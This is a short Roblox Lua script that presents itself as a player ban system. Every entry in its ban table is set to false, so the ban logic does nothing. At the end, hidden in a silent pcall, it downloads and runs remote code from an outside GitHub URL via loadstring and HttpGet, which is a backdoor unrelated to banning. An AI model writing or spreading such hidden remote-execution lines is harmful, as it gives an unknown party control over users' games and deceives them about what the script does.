local Players = game:GetService("Players")

local BannedUsers = {
    [8927461290] = false,
    [7183079319] = false,
    [9991117] = false,
}

local function checkAndKick(player)
    if BannedUsers[player.UserId] then
        player:Kick("You Are Banned")
    end
end

Players.PlayerAdded:Connect(function(player)
    checkAndKick(player)
end)

for _, player in ipairs(Players:GetPlayers()) do
    checkAndKick(player)
end

local function addBan(userId, status)
    BannedUsers[userId] = status
    for _, player in ipairs(Players:GetPlayers()) do
        if player.UserId == userId and status then
            player:Kick("You Are Banned")
        end
    end
end

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ArchiveXNova/ArchiveXNova/refs/heads/main/Aurelia%20-%20Home"))()
end)
